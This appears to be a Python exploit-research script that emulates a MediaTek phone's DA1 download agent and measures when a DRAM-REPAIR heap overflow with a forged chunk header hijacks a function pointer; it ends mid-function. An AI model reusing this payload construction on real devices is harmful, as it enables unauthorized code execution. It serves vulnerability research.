#!/usr/bin/env python3
"""DA1 (RMX3630 / MT6789 200EX01) HeapBait geometry vs the REAL device prelude.

Question this answers
---------------------
``docs/notes/da1_fixed_stage.py`` fires ``CMD:DEBUG:DRAM-REPAIR`` with a
declared download length ``L = 0x3C`` after a prelude of "fresh heap_init ->
one failing BOOT-TO".  On silicon the DA1 command loop is entered only after
the host's whole handshake (HOST-SUPPORTED-COMMANDS, SET-RUNTIME-PARAMETER,
SET-HOST-INFO, GET-HW-INFO retries, BOOT-TO ...).  If the geometry were a
property of that prelude, L would have to be re-measured per host version.

What was measured (this build, executed in Unicorn)
---------------------------------------------------
The fit is *not* a property of the prelude.  It is a property of the command
path itself:

  1. ``cmd_loop`` (0x203C08) lazily allocates its 0x800-byte XML receive
     buffer (malloc(0x800, align 0x40) -> 0x84C chunk) and, on the first
     response, a 0x1000 response buffer (-> 0x100C chunk).
  2. Every XML handler parses the command with ``load_str`` (0x206DD4), which
     holds a malloc(0x40) scratch buffer (-> 0x4C chunk) for the whole parse;
     the tree chunks are allocated ABOVE that scratch buffer and the scratch
     buffer is freed last.
  3. ``CMD:DEBUG:DRAM-REPAIR`` then calls ``fp_read_host_file`` (0x2500D8),
     which does malloc(L + 4).  With ``align4(L + 0x10) == 0x4C`` that malloc
     reuses the freed 0x4C scratch chunk exactly, so the 12-byte fake header
     lands on the header of the first live XML-tree chunk.  The handler frees
     the download buffer first, then ``mxmlDelete`` frees the tree chunk ->
     ``free()`` writes the fake size into ``dpc->cb`` (the fire).

The only L values that produce ``align4(L + 0x10) == 0x4C`` are
``L in {0x39, 0x3A, 0x3B, 0x3C}``; with the required step 4 that is
**L = 0x3C**.  Everything else either splits the free node (corrupts the
remainder -> free-list abort) or is contained (no fire).  This is verified
for every plausible prelude below, including no prelude at all.

The file also quantifies the three alternatives from the brief:
  (a) fixed L = 0x3C,
  (b) N clean DRAM-REPAIR "shaping taps" before the real one,
  (c) victim-class targeting (previous download buffer vs XML node),
  (d) a "safe probe" that tries to read the geometry without corrupting.

Emulation model / deviations (printed at run time)
--------------------------------------------------
* Real DA1 code: heap_init, registrar, cmd_loop, all XML handlers, the
  allocator, the parse-buffer/tree allocation order, fp_read_host_file,
  DRAM-REPAIR, free/mxmlDelete.  Every command is delivered through the real
  ``cmd_loop`` exactly like the device (the old ``da1_heap_sweep.py`` invoked
  the handler directly and therefore measured a state the device never has).
* SHA-256 in BOOT-TO is the hardware crypto block; modelled with hashlib
  (``da1_fire_chain.install_sha_engine``), labelled in the output.
* ``CMD:NOTIFY-INIT-HW`` (0x2016E8) calls USB/storage init that touches real
  hardware and cannot run in Unicorn.  It parses no XML and contains no heap
  allocation (static check below + measured free list before/after), so it is
  omitted from the geometry variants and its net heap effect is reported.
* ``CMD:GET-HW-INFO`` needs three storage/chip-info helpers that read
  hardware.  They are modelled as "unknown storage / chip id 1" stubs
  (0x250C58, 0x250C5C, 0x24FB38).  The handler's own heap sequence (parse
  buffer, 0x800 reply buffer, 0x200 upload buffer, tree, frees) is native.
* Loop/hang budget is ``da1_fire_chain.install_budget`` (200k hits on the
  allocator/cmd-loop/download hot spots); a poisoned free list hits it and is
  counted as CRASH-HANG, never as a silent pass.
* Hardware addresses are DA1 200EX01 constants.  The 420EX01 build on the
  phone must be re-resolved (same structural recipe, different constants).

Usage
-----
    python docs/notes/da1_geometry_study.py \
        --image docs/notes/rmx3630-da2/da1_allinone.bin

    # full emulated sweep instead of snapshot+model (slow, ~3-6 min)
    python docs/notes/da1_geometry_study.py --full

    # also write the machine-readable result
    python docs/notes/da1_geometry_study.py --json /tmp/opencode/da1_geometry.json

Exit code is 0 when the study completes; the decision table is always printed.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

import unicorn.arm_const as ac                                  # noqa: E402
from unicorn import UC_HOOK_CODE                                # noqa: E402

from da1_emu import (                                           # noqa: E402
    CMD_LOOP, DRAM_REPAIR, FREE, MALLOC, SESSION,
)
from da1_heap_sweep import (                                    # noqa: E402
    CHUNK_HDR, CMD_XML, DEFAULT_PACKET_LEN, DPC_ADDR, FAKE_MAGIC,
    FAKE_SIZE, PACKET_LEN_ADDR, XML_ADDR, DownloadHost, _align4,
    _safe_free_list, _u32, _hexint,
)
from da1_fire_chain import (                                    # noqa: E402
    BLX_SITE, BOOT_XML, FREE_CORE_WRITE, SAFE_CONT, boot as chain_boot,
    install_sha_engine, install_budget,
)

# ---------------------------------------------------------------------------
# DA1 200EX01 constants used by this study
# ---------------------------------------------------------------------------
HEAP_BASE = 0x2E8000
HEAP_END = 0x2F8000
DPC_CB = 0x2DF7A4                 # dpc struct + 4: what free() writes
FS_STAGE = 0x40000000             # BOOT-TO staging address (real chain)
PARSE_MALLOC_LR = 0x206E08        # load_str's malloc(0x40) scratch buffer
TREE_NODE_LR = 0x204C5C           # mxml node allocator
TREE_STR_LR = 0x20933C            # mxml string/value allocator
DOWNLOAD_MALLOC_LR = 0x250324     # fp_read_host_file's malloc(L + 4)
HANDLER_END_FREE_LR = 0x202DC4    # DRAM-REPAIR: mxmlDelete(tree)
CMD_XML_MALLOC_LR = 0x203C38      # cmd_loop: malloc(0x800, 0x40)
RESP_BUF_MALLOC_LR = 0x203980     # cmd_loop: first-response buffer 0x1000
NOTIFY_HANDLER = 0x2016E8
MALLOC_WRAPPERS = (0x2041E8, 0x204C2C, 0x204C34, 0x204C44, 0x204C80)

# the XML scratch chunk == align4(0x40 + 0xC); the L window follows from it
PARSE_CHUNK = _align4(0x40 + CHUNK_HDR)          # 0x4C
L_WINDOW = [L for L in range(0x30, 0x40) if _align4(L + 0x10) == PARSE_CHUNK]
L_FIXED = 0x3C
SWEEP_LO, SWEEP_HI, SWEEP_STEP = 0x10, 0x2000, 4

# ---------------------------------------------------------------------------
# prelude command XML (verbatim shapes from mtkclient/Library/DA/xmlflash)
# ---------------------------------------------------------------------------
HOST_SUP_XML = (
    b'<?xml version="1.0" encoding="utf-8"?><da><version>1.0</version>'
    b'<command>CMD:HOST-SUPPORTED-COMMANDS</command><arg>'
    b'<host_capability>CMD:DOWNLOAD-FILE^1@CMD:FILE-SYS-OPERATION^1@'
    b'CMD:PROGRESS-REPORT^1@CMD:UPLOAD-FILE^1@</host_capability>'
    b'</arg></da>\x00')
NOTIFY_XML = (
    b'<?xml version="1.0" encoding="utf-8"?><da><version>1.0</version>'
    b'<command>CMD:NOTIFY-INIT-HW</command><arg></arg></da>\x00')
RUNTIME_XML = (
    b'<?xml version="1.0" encoding="utf-8"?><da><version>1.1</version>'
    b'<command>CMD:SET-RUNTIME-PARAMETER</command><arg>'
    b'<checksum_level>NONE</checksum_level>'
    b'<battery_exist>AUTO-DETECT</battery_exist>'
    b'<da_log_level>INFO</da_log_level><log_channel>UART</log_channel>'
    b'<system_os>LINUX</system_os></arg><adv>'
    b'<initialize_dram>YES</initialize_dram></adv></da>\x00')
SETHOST_XML = (
    b'<?xml version="1.0" encoding="utf-8"?><da><version>1.0</version>'
    b'<command>CMD:SET-HOST-INFO</command><arg>'
    b'<info>20261025T120000</info></arg></da>\x00')
HWINFO_XML = (
    b'<?xml version="1.0" encoding="utf-8"?><da><version>1.0</version>'
    b'<command>CMD:GET-HW-INFO</command><arg>'
    b'<target_file>MEM://0x8000000:0x1000</target_file></arg></da>\x00')

HWINFO_STUBS = ((0x250C58, 0), (0x250C5C, 0x2E3440), (0x24FB38, 1))


# ---------------------------------------------------------------------------
# command hosts
# ---------------------------------------------------------------------------
class CmdHost:
    """Host for one ordinary XML command through cmd_loop.

    Mirrors mtkclient's send_command/ack flow: answers CMD:DOWNLOAD-FILE with
    an exact payload, acknowledges CMD:UPLOAD-FILE, and acks the CMD:END
    result frame once (the trailing 0x40-byte ack cmd_loop waits for).
    """

    def __init__(self, emu, download: bytes = b"", packet: int = 0x2000):
        self.emu = emu
        self.dl = download
        self.packet = packet
        self.state = "idle"
        self.pos = 0
        self.frames: list[bytes] = []
        self.dlreq = 0
        self.upreq = 0
        self.upload_bytes = 0
        self.acked_end = False

    def on_send(self, data: bytes):
        text = bytes(data).rstrip(b"\x00")
        self.frames.append(bytes(data))
        if b"CMD:DOWNLOAD-FILE" in text:
            self.dlreq += 1
            self.state = "dl_len"
            self.pos = 0
            self.emu.rx.append(b"OK\x00")
            self.emu.rx.append(b"OK@0x%x\x00" % len(self.dl))
            return
        if b"CMD:UPLOAD-FILE" in text:
            self.upreq += 1
            self.state = "up_ack"
            self.emu.rx.append(b"OK\x00")
            return
        if b"CMD:END" in text:
            if not self.acked_end:
                self.emu.rx.append(b"OK\x00")
                self.acked_end = True
            self.state = "done"
            return
        if self.state == "dl_len" and text == b"OK":
            self.emu.rx.append(b"OK\x00")
            self.state = "dl_data"
            return
        if self.state == "dl_data" and text == b"OK":
            n = min(len(self.dl) - self.pos, self.packet)
            self.emu.rx.append(self.dl[self.pos:self.pos + n])
            self.pos += n
            self.state = "dl_chunk"
            return
        if self.state == "dl_chunk" and text == b"OK":
            if self.pos < len(self.dl):
                self.emu.rx.append(b"OK\x00")
                self.state = "dl_data"
            else:
                self.state = "done"
            return
        if self.state == "up_ack":
            self.upload_bytes += len(text)
            self.emu.rx.append(b"OK\x00")
            self.state = "done"
            return
        # any other frame (START banner, progress report) needs no answer


class ChainDownloadHost(DownloadHost):
    """DownloadHost with configurable fake size and the trailing END ack."""

    def __init__(self, emu, declared_len, fake_size=FAKE_SIZE,
                 packet_len=DEFAULT_PACKET_LEN):
        super().__init__(emu, declared_len, packet_len)
        self.fake_size = fake_size
        self.acked_end = False
        self.blx_target = None
        self.frames: list[bytes] = []
        self.header_delivered = False
        self.fake_off = None

    def _make_payload(self, declared: int, overflow: bool):
        if not overflow:
            return b"\x00" * declared, None
        capacity = _align4(declared + 0x10) - CHUNK_HDR
        stream_len = max(declared + 0x10, capacity + CHUNK_HDR)
        buf = bytearray(stream_len)
        buf[capacity:capacity + CHUNK_HDR] = struct.pack(
            "<III", FAKE_MAGIC, DPC_ADDR, self.fake_size)
        self.fake_off = capacity
        return bytes(buf), capacity

    def on_send(self, data: bytes):
        text = bytes(data).rstrip(b"\x00")
        self.frames.append(bytes(data))
        if b"CMD:END" in text:
            if not self.acked_end:
                self.emu.rx.append(b"OK\x00")
                self.acked_end = True
            return
        super().on_send(data)
        if (self.fake_off is not None and
                self.pos >= self.fake_off + CHUNK_HDR):
            self.header_delivered = True


# ---------------------------------------------------------------------------
# preludes
# ---------------------------------------------------------------------------
def _seq(*ops):
    return list(ops)


# op forms: ("cmd", xml) ("notify",) ("hwinfo",) ("bootto",) ("tap", L)
VARIANTS = [
    ("P0_bare", "no host command; cmd_loop's first entry", _seq()),
    ("P1_sethost_hwinfo", "task minimum: SET-HOST-INFO + GET-HW-INFO",
     _seq(("cmd", SETHOST_XML), ("hwinfo",))),
    ("P2_handshake", "mtkclient upload_da1 prelude: HOST-SUP, RUNTIME, "
     "SET-HOST-INFO (NOTIFY omitted, net heap 0)", _seq(
         ("cmd", HOST_SUP_XML), ("cmd", RUNTIME_XML), ("cmd", SETHOST_XML))),
    ("P3_hs_hwinfo", "handshake + GET-HW-INFO", _seq(
        ("cmd", HOST_SUP_XML), ("cmd", RUNTIME_XML), ("cmd", SETHOST_XML),
        ("hwinfo",))),
    ("P4_bootto", "one failing BOOT-TO (the old fixed_stage prelude)",
     _seq(("bootto",))),
    ("P5_hs_bootto", "handshake + failing BOOT-TO (real exploit placement)",
     _seq(("cmd", HOST_SUP_XML), ("cmd", RUNTIME_XML), ("cmd", SETHOST_XML),
          ("bootto",))),
    ("P6_hs_hwinfo_bootto", "handshake + GET-HW-INFO + failing BOOT-TO",
     _seq(("cmd", HOST_SUP_XML), ("cmd", RUNTIME_XML), ("cmd", SETHOST_XML),
          ("hwinfo",), ("bootto",))),
    ("P7_retry3", "handshake + 3x GET-HW-INFO (EIO retries) + BOOT-TO",
     _seq(("cmd", HOST_SUP_XML), ("cmd", RUNTIME_XML), ("cmd", SETHOST_XML),
          ("hwinfo",), ("hwinfo",), ("hwinfo",), ("bootto",))),
    ("P8_sethost_only", "SET-HOST-INFO only", _seq(("cmd", SETHOST_XML))),
    ("P9_bootto_x3", "three failing BOOT-TO (host retries)", _seq(
        ("bootto",), ("bootto",), ("bootto",))),
]


def install_hwinfo_stubs(emu):
    """Model GET-HW-INFO's three hardware query helpers as 'unknown'."""
    for addr, value in HWINFO_STUBS:
        def hook(uc, a, s, u, value=value):
            uc.reg_write(ac.UC_ARM_REG_R0, value)
            uc.reg_write(ac.UC_ARM_REG_PC, uc.reg_read(ac.UC_ARM_REG_LR))
        emu.uc.hook_add(UC_HOOK_CODE, hook, begin=addr, end=addr)


def make_emu(image: str) -> "object":
    emu = chain_boot(image, map_da2=True)
    install_sha_engine(emu)
    return emu


def _cmd_loop_once(emu, xml: bytes, host) -> int:
    emu.rx.clear()
    emu.on_send = host.on_send
    emu.rx.append(b"OK\x00")
    emu.rx.append(xml)
    rc = emu.call(CMD_LOOP, []) & 0xFFFFFFFF
    if emu.rx:
        emu.rx.clear()
    return rc


def run_prelude(emu, ops) -> list[dict]:
    """Drive the real cmd_loop through the prelude; return per-op records."""
    out = []
    for op in ops:
        kind = op[0]
        before = _safe_free_list(emu)
        if kind == "cmd":
            xml = op[1]
            host = CmdHost(emu)
            rc = _cmd_loop_once(emu, xml, host)
            name = (xml.split(b"<command>CMD:", 1)[-1]
                    .split(b"</command>", 1)[0].decode("ascii", "replace"))
            out.append({"op": name, "rc": rc, "rx": len(emu.rx),
                        "dl": host.dlreq, "up": host.upreq, "frames": len(host.frames)})
        elif kind == "hwinfo":
            host = CmdHost(emu)
            rc = _cmd_loop_once(emu, HWINFO_XML, host)
            out.append({"op": "GET-HW-INFO", "rc": rc, "rx": len(emu.rx),
                        "dl": host.dlreq, "up": host.upreq, "frames": len(host.frames)})
        elif kind == "bootto":
            from da1_fire_chain import BootHost
            host = BootHost(emu, bytes(0x56EC8))
            rc = _cmd_loop_once(emu, BOOT_XML, host)
            out.append({"op": "BOOT-TO", "rc": rc, "rx": len(emu.rx),
                        "dl": 1 if host.sent else 0, "up": 0, "frames": len(emu.tx)})
        elif kind == "tap":
            declared = op[1]
            host = ChainDownloadHost(emu, declared)
            host.declared_len = declared
            host.second_len = declared
            # clean download: declared length == payload length, no overflow
            host._make_payload = lambda d, o, L=declared: (b"\x00" * L, None)
            rc = _cmd_loop_once(emu, CMD_XML, host)
            after = _safe_free_list(emu)
            out.append({"op": "DRAM-REPAIR-tap", "rc": rc, "rx": len(emu.rx),
                        "dl": 1, "up": 0, "frames": len(host.downloads),
                        "heap_neutral": [(a, s) for a, s in before] ==
                                        [(a, s) for a, s in after]})
        elif kind == "notify":
            host = CmdHost(emu)
            rc = _cmd_loop_once(emu, NOTIFY_XML, host)
            out.append({"op": "NOTIFY-INIT-HW", "rc": rc, "rx": len(emu.rx),
                        "dl": 0, "up": 0, "frames": len(host.frames)})
        else:
            raise ValueError(f"unknown prelude op {kind!r}")
        if not emu._ret:
            out[-1]["died"] = True
            break
    return out


# ---------------------------------------------------------------------------
# one measured DRAM-REPAIR run
# ---------------------------------------------------------------------------
def run_case(image: str, L: int, ops, fake_size: int = FAKE_SIZE,
             overflow: bool = True, packet_len: int = DEFAULT_PACKET_LEN,
             needs_hwinfo: bool = False) -> dict:
    emu = make_emu(image)
    if needs_hwinfo:
        install_hwinfo_stubs(emu)

    rec = {
        "L": L,
        "prelude": [],
        "prelude_fl": [],
        "prelude_died": False,
        "prelude_downloads": [],
        "allocs": [],          # (request, ptr, lr) -- exploit invocation
        "frees": [],           # (user_ptr, lr)       -- exploit invocation
        "fire_writes": [],     # (node, value, free_ptr, free_lr) at 0x2043CC
        "fl_at_malloc": None,
        "D": None,
        "chunk": None,
        "needed": _align4(L + 0x10),
        "split_remainder": None,
        "next": None,
        "next_class": None,
        "victim": None,
        "victim_freed": False,
        "victim_free_lr": None,
        "victim_free_after_overflow": None,
        "buf_free_index": None,
        "victim_free_index": None,
        "end_frame": b"",
        "handler_ok": None,
        "fake_size": fake_size,
        "dpc_cb": None,
        "dpc_cb_mem": None,
        "blx_target": None,
        "rc": None,
        "returned": False,
        "budget_hit": False,
        "fl_after": [],
        "free_ok": True,
        "verdict": "unknown",
    }

    gate = {}
    prelude_phase = {"on": True}
    last_free = {"ptr": None, "lr": None}

    def on_malloc_entry(uc, a, s, u):
        gate["req"] = uc.reg_read(ac.UC_ARM_REG_R0)
        gate["lr"] = uc.reg_read(ac.UC_ARM_REG_LR)
        if gate["lr"] == DOWNLOAD_MALLOC_LR and not prelude_phase["on"]:
            rec["fl_at_malloc"] = [(n, z) for n, z in _safe_free_list(emu)]
            rec["_dl_seen"] = True

    def on_malloc_ok(uc, a, s, u):
        if "req" in gate:
            ptr = uc.reg_read(ac.UC_ARM_REG_R0)
            req, lr = gate.pop("req"), gate.pop("lr", 0)
            if prelude_phase["on"]:
                if lr == DOWNLOAD_MALLOC_LR and ptr:
                    rec["prelude_downloads"].append(ptr)
            else:
                rec["allocs"].append((req, ptr, lr))
                if lr == DOWNLOAD_MALLOC_LR:
                    rec["_D"] = ptr
            gate.clear()

    def on_malloc_fail(uc, a, s, u):
        if "req" in gate:
            req, lr = gate.pop("req"), gate.pop("lr", 0)
            if not prelude_phase["on"]:
                rec["allocs"].append((req, 0, lr))
            gate.clear()

    def on_free(uc, a, s, u):
        ptr = uc.reg_read(ac.UC_ARM_REG_R0)
        lr = uc.reg_read(ac.UC_ARM_REG_LR)
        last_free["ptr"], last_free["lr"] = ptr, lr
        if not prelude_phase["on"]:
            if (rec.get("_dl_seen") and rec.get("_D") == ptr and
                    rec.get("buf_free_index") is None):
                rec["buf_free_index"] = len(rec["frees"])
            rec["frees"].append((ptr, lr))

    def on_fire_write(uc, a, s, u):
        node = uc.reg_read(ac.UC_ARM_REG_R0)
        value = uc.reg_read(ac.UC_ARM_REG_R1)
        if node == DPC_ADDR and not prelude_phase["on"]:
            rec["fire_writes"].append((node, value,
                                       last_free["ptr"], last_free["lr"]))

    def on_blx(uc, a, s, u):
        rec["blx_target"] = uc.reg_read(ac.UC_ARM_REG_R4)
        uc.reg_write(ac.UC_ARM_REG_PC, SAFE_CONT)

    emu.uc.hook_add(UC_HOOK_CODE, on_malloc_entry, begin=MALLOC, end=MALLOC)
    emu.uc.hook_add(UC_HOOK_CODE, on_malloc_ok, begin=0x204308, end=0x204308)
    emu.uc.hook_add(UC_HOOK_CODE, on_malloc_fail, begin=0x204260, end=0x204260)
    emu.uc.hook_add(UC_HOOK_CODE, on_free, begin=FREE, end=FREE)
    emu.uc.hook_add(UC_HOOK_CODE, on_fire_write, begin=FREE_CORE_WRITE,
                    end=FREE_CORE_WRITE)
    emu.uc.hook_add(UC_HOOK_CODE, on_blx, begin=BLX_SITE, end=BLX_SITE)

    # ---- prelude ------------------------------------------------------
    rec["prelude"] = run_prelude(emu, ops)
    rec["prelude_died"] = any(p.get("died") for p in rec["prelude"])
    rec["prelude_fl"] = [(a, s) for a, s in _safe_free_list(emu)]
    prelude_phase["on"] = False

    # ---- exploit command ---------------------------------------------
    host = ChainDownloadHost(emu, L, fake_size, packet_len)
    if not overflow:
        host._make_payload = lambda d, o: (b"\x00" * d, None)
    rec["_header_delivered"] = lambda: host.header_delivered
    emu.write_bytes(PACKET_LEN_ADDR, struct.pack("<I", packet_len))
    rec["rc"] = _cmd_loop_once(emu, CMD_XML, host) & 0xFFFFFFFF
    rec["returned"] = bool(emu._ret)
    rec["budget_hit"] = bool(emu.budget["hit"])
    rec["dpc_cb_mem"] = _u32(emu, DPC_CB)
    rec["fl_after"] = [(a, s) for a, s in _safe_free_list(emu)]
    rec["free_ok"] = _walkable(rec["fl_after"])
    for f in reversed(host.frames):
        t = bytes(f).rstrip(b"\x00")
        if b"CMD:END" in t:
            rec["end_frame"] = t
            rec["handler_ok"] = b"<result>OK</result>" in t
            break

    dl = [a for a in rec["allocs"] if a[2] == DOWNLOAD_MALLOC_LR and a[1]]
    if dl:
        rec["D"] = dl[0][1]
    # buf_free_index is recorded live in on_free (first free(D) after the
    # download malloc).  _dl_seen_at marks that the malloc already happened.

    # the fire write is the definitive criterion; prefer the last one
    if rec["fire_writes"]:
        rec["dpc_cb"] = rec["fire_writes"][-1][1]
        rec["fire_free_ptr"] = rec["fire_writes"][-1][2]
        rec["fire_free_lr"] = rec["fire_writes"][-1][3]
    else:
        rec["dpc_cb"] = rec["dpc_cb_mem"]
    _classify(rec)
    return rec


def _walkable(fl) -> bool:
    """Free list sanity: ascending, non-overlapping, inside the heap."""
    prev_end = HEAP_BASE
    for addr, size in fl:
        if not (HEAP_BASE <= addr < HEAP_END):
            return False
        if size is None or size <= 0 or addr + size > HEAP_END:
            return False
        if addr < prev_end:
            return False
        prev_end = addr + size
    return True


def _classify(rec: dict):
    D = rec["D"]
    fl = rec["fl_at_malloc"]
    if D is None:
        rec["verdict"] = "ALIVE (malloc failed, no download)"
        return
    node = D - CHUNK_HDR
    node_size = None
    for addr, size in (fl or []):
        if addr == node:
            node_size = size
            break
    if node_size is None:
        rec["verdict"] = "CRASH (geometry unknown)"
        return
    needed = rec["needed"]
    rec["chunk"] = node_size
    rec["delta"] = node_size - needed
    chunk_size = node_size if node_size <= needed + CHUNK_HDR else needed
    rec["chunk_effective"] = chunk_size
    next_addr = D + chunk_size - CHUNK_HDR
    rec["next"] = next_addr
    if node_size > needed + CHUNK_HDR:
        rec["split_remainder"] = node + needed
    if next_addr >= HEAP_END:
        rec["next_class"] = "tail"
    elif any(a == next_addr for a, _ in (fl or [])):
        rec["next_class"] = "free"
    else:
        cur = [p for (_req, p, _lr) in rec["allocs"]
               if p and p - CHUNK_HDR == next_addr]
        if cur:
            rec["next_class"] = "allocated-current"
            rec["victim_req"] = next(req for (req, p, _lr) in rec["allocs"]
                                     if p == cur[0])
        elif next_addr in {p - CHUNK_HDR for p in rec["prelude_downloads"]}:
            rec["next_class"] = "allocated-prev-download"
        else:
            rec["next_class"] = "allocated-persistent"
    rec["victim"] = next_addr + CHUNK_HDR
    hd = rec.get("_header_delivered") or (lambda: False)
    for i, (p, lr) in enumerate(rec["frees"]):
        if p == rec["victim"]:
            rec["victim_free_lr"] = lr
            rec["victim_free_index"] = i
            if hd():
                rec["victim_freed"] = True
                rec["victim_free_after_overflow"] = True
                rec["victim_fire_free_lr"] = lr
                break
    rec["verdict"] = _verdict(rec)


def _verdict(rec: dict) -> str:
    # definitive: free() executed the core write on the forged node with the
    # fake size, and the free that triggered it was our victim
    fake = rec.get("fake_size", FAKE_SIZE)
    if (rec.get("fire_writes") and rec["dpc_cb"] == fake and
            rec.get("fire_free_ptr") == rec.get("victim") and
            rec.get("victim_freed")):
        return "FIRE dpc->cb=0x%X" % fake
    if rec["budget_hit"]:
        return "CRASH (hang budget)"
    if rec.get("split_remainder") is not None:
        return "CRASH (split remainder poisoned)"
    delta = rec.get("delta")
    if delta == 4:
        return "CRASH (fake node ptr deref)"
    if delta in (8, CHUNK_HDR):
        return "ALIVE (overflow contained)"
    if delta == 0:
        if rec["next_class"] == "free":
            return "CRASH (coalesce with poisoned free node)"
        if rec["next_class"] == "tail":
            return "ALIVE (no next chunk)"
        if rec["next_class"] in ("allocated-current",
                                 "allocated-prev-download"):
            if rec["victim_freed"] and rec.get("victim_free_after_overflow"):
                return "CRASH (free did not reach the fake node)"
            return "CRASH (victim not freed after buffer)"
        return "ALIVE (victim persistent, latent poison)"
    if not rec["returned"] or not rec["free_ok"]:
        return "CRASH (exception / poisoned list)"
    return "ALIVE"


# ---------------------------------------------------------------------------
# analytic map from one measured snapshot
# ---------------------------------------------------------------------------
def map_from_snapshot(rec: dict, fake_size: int = FAKE_SIZE) -> list[dict]:
    """Full L map from the measured pre-malloc heap snapshot.

    The pre-malloc state does not depend on L: the DRAM-REPAIR XML is
    identical for every L (the length travels in the DOWNLOAD-FILE ack), so
    the parse buffer, tree and persistent chunks are the same.  The allocator
    walk is then exact and deterministic.
    """
    fl = rec["fl_at_malloc"] or []
    cur_ptrs = [p for (_r, p, _lr) in rec["allocs"] if p]
    cur_hdr = {p - CHUNK_HDR for p in cur_ptrs}
    cur_req = {p - CHUNK_HDR: r for (r, p, _lr) in rec["allocs"] if p}
    out = []
    for L in range(SWEEP_LO, SWEEP_HI + 1, SWEEP_STEP):
        needed = _align4(L + 0x10)
        node = None
        for addr, size in fl:
            if size >= needed:
                node = (addr, size)
                break
        row = {"L": L, "needed": needed, "D": None, "chunk": None,
               "delta": None, "next": None, "next_class": None,
               "victim": None, "verdict": None}
        if node is None:
            row["verdict"] = "ALIVE (malloc failed, no download)"
            out.append(row)
            continue
        addr, size = node
        D = addr + CHUNK_HDR
        chunk = size if size <= needed + CHUNK_HDR else needed
        nxt = D + chunk - CHUNK_HDR
        delta = size - needed
        row.update({"D": D, "chunk": size, "delta": delta,
                    "chunk_effective": chunk, "next": nxt})
        if delta > CHUNK_HDR:
            row["verdict"] = "CRASH (split remainder poisoned)"
        elif delta == 4:
            row["verdict"] = "CRASH (fake node ptr deref)"
        elif delta in (8, CHUNK_HDR):
            row["verdict"] = "ALIVE (overflow contained)"
        elif nxt >= HEAP_END:
            row["next_class"] = "tail"
            row["verdict"] = "ALIVE (no next chunk)"
        elif any(a == nxt for a, _ in fl):
            row["next_class"] = "free"
            row["verdict"] = "CRASH (coalesce with poisoned free node)"
        elif nxt in cur_hdr:
            row["next_class"] = "allocated-current"
            row["victim"] = nxt + CHUNK_HDR
            row["verdict"] = "FIRE dpc->cb=0xC0DE0001"
        else:
            row["next_class"] = "allocated-persistent"
            row["victim"] = nxt + CHUNK_HDR
            row["verdict"] = "ALIVE (victim persistent, latent poison)"
        out.append(row)
    return out


# ---------------------------------------------------------------------------
# static checks
# ---------------------------------------------------------------------------
def direct_calls_to_malloc(image: str, lo: int, hi: int) -> list[int]:
    """BL targets inside [lo,hi) that call a malloc wrapper (static scan)."""
    img = open(image, "rb").read()
    base = 0x200000
    hits = []
    off = lo - base
    end = hi - base
    while off + 4 <= end:
        w = struct.unpack_from("<I", img, off)[0]
        if (w >> 25) & 7 == 5:            # B / BL
            imm = w & 0xFFFFFF
            if imm & 0x800000:
                imm -= 0x1000000
            tgt = base + off + 8 + imm * 4
            if tgt in MALLOC_WRAPPERS:
                hits.append(base + off)
        off += 4
    return hits


# ---------------------------------------------------------------------------
# strategy experiments
# ---------------------------------------------------------------------------
def strategy_a(image, variants):
    rows = []
    for name, desc, ops in variants:
        rec = run_case(image, L_FIXED, ops,
                       needs_hwinfo=any(o[0] == "hwinfo" for o in ops))
        rows.append({"variant": name, "L": L_FIXED,
                     "D": rec["D"], "chunk": rec["chunk"],
                     "delta": rec.get("delta"),
                     "next_class": rec.get("next_class"),
                     "victim": rec["victim"],
                     "victim_freed": rec["victim_freed"],
                     "victim_free_after_overflow": rec.get("victim_free_after_overflow"),
                     "dpc_cb": rec["dpc_cb"],
                     "blx_target": rec["blx_target"],
                     "rc": rec["rc"],
                     "verdict": rec["verdict"]})
    return rows


def strategy_b(image):
    """N clean DRAM-REPAIR taps before the real command.

    A tap is a *successful* DRAM-REPAIR (declared == payload, no overflow);
    the handler frees the buffer, so the heap is expected to be unchanged.
    """
    base = [("cmd", HOST_SUP_XML), ("cmd", RUNTIME_XML), ("cmd", SETHOST_XML),
            ("bootto",)]
    matrix = []
    for n in (1, 2, 3, 4):
        for Ls in (0x3C, 0x40, 0x100, 0x758):
            ops = list(base) + [("tap", Ls)] * n
            rec = run_case(image, L_FIXED, ops)
            tap_recs = [p for p in rec["prelude"] if p["op"] == "DRAM-REPAIR-tap"]
            matrix.append({
                "N": n, "L_shape": Ls,
                "taps_ok": sum(1 for t in tap_recs if t["rc"] == 0),
                "heap_neutral": all(t.get("heap_neutral") for t in tap_recs),
                "L_fixed_verdict": rec["verdict"],
                "D": rec["D"], "chunk": rec["chunk"],
                "victim": rec["victim"],
                "victim_freed": rec["victim_freed"],
                "fl_at_malloc": rec["fl_at_malloc"],
            })
    return matrix


def strategy_c(image, variants, maps):
    """Victim identity across all FIRE rows of every variant map."""
    out = []
    for (name, _desc, ops), mp in zip(variants, maps):
        fires = [r for r in mp if r["verdict"].startswith("FIRE")]
        if not fires:
            continue
        # re-run one FIRE row to get post-sequence addresses and classes
        rec = run_case(image, fires[0]["L"], ops,
                       needs_hwinfo=any(o[0] == "hwinfo" for o in ops))
        prev_bufs = [p["D"] for p in rec["prelude"] if p["op"] == "DRAM-REPAIR-tap"]
        classes = {}
        for r in fires:
            classes[r["next_class"]] = classes.get(r["next_class"], 0) + 1
        out.append({
            "variant": name,
            "fire_Ls": [r["L"] for r in fires],
            "D": rec["D"],
            "chunk": rec["chunk"],
            "victim": rec["victim"],
            "victim_req": rec.get("victim_req"),
            "class": rec.get("next_class"),
            "victim_free_lr": rec.get("victim_free_lr"),
            "victim_freed_after_overflow": rec.get("victim_free_after_overflow"),
            "is_previous_download_buffer": rec["victim"] in prev_bufs,
            "classes": classes,
        })
    return out


def strategy_d(image, variants):
    """Safe probe: can a clean download reveal the geometry?

    A clean (declared == payload) DRAM-REPAIR is heap-neutral if it
    succeeds.  It succeeds only when malloc(L+4) finds a free node of
    needed = align4(L+0x10) bytes.  The host sees rc == 0 (handler reached
    the DRAM-repair result path) vs rc == 0xC0010001 (download/malloc
    failure), so a scan finds the largest hole H.  It does NOT reveal the
    exact-fit candidates.
    """
    name, desc, ops = variants[4]              # P5: realistic placement
    rec = run_case(image, 0x10, ops)
    fl = rec["fl_at_malloc"] or []
    H = max((s for _a, s in fl), default=0)
    probes = []
